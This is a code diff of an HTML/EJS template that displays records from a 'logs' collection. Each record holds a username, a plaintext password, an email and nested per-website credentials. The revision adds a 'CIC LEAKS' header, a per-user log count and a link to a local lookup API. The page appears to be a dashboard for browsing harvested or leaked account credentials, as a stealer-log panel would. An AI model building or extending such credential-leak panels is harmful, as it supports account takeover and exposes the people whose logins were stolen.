@@ -27,30 +27,27 @@
     </style>
 </head>
 <body>
-    <%for(let i=0;i<logs.length;i++){%>
-    <div class="row m-3" >
-        <div class="col" >
-          <nav aria-label="breadcrumb" class="rounded-3 p-3 mb-4" style="background-color: white;">
-            <ol class="breadcrumb mb-0">
-              <li class="breadcrumb-item"><b>Username</b>: <%= logs[i].username%> <br> <b>Password</b>: <%= logs[i].password%><br><b>Email</b>: <%= logs[i].email%></li>
-            </ol>
-          </nav>
-        </div>
+  <div class="row m-3" >
+    <div class="col-sm-12" >
+      <nav aria-label="breadcrumb" class="rounded-3 p-3 mb-4" style="background-color: white;">
+        <ol class="breadcrumb mb-0 d-flex" style="justify-content: center;">
+          <li class="breadcrumb-item"><b>CIC LEAKS</b></li>
+        </ol>
+      </nav>
     </div>
-    <div class="row m-3">
-        <%for(let j=0;j<logs[i].links.length;j++){%>
+    <%for(let i=0;i<logs.length;i++){%>
         <div class="col-sm-3 mb-4">
           <div class="card">
             <div class="card-body">
-              <p class="card-text">👤<b>Username</b>: <%=logs[i].links[j].username%></p>
-              <p class="card-text">🗝️<b>Password</b>: <%=logs[i].links[j].password%></p>
-              <a href="<%=logs[i].links[j].url%>" target="_blank" style="text-decoration: none;"><button type="button" class="btn btn-outline-primary ms-1 px-3">Visit website↗️</button></a>
+              <p class="card-text">👤<b>Username</b>: <%=logs[i].username%></p>
+              <p class="card-text">🗝️<b>Password</b>: <%=logs[i].password%></p>
+              <p class="card-text">🔢<b>Logs</b>: <%=logs[i].links.length%></p>
+              <a href="http://127.0.0.1:8000/api/findby/username/<%=logs[i].username%>" target="_blank" style="text-decoration: none;"><button type="button" class="btn btn-outline-primary ms-1 px-3">Visit website↗️</button></a>
             </div>
           </div>
         </div>
-        <%}%>
-    </div>
     <%}%>
+    </div>
 </body>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
 </html>
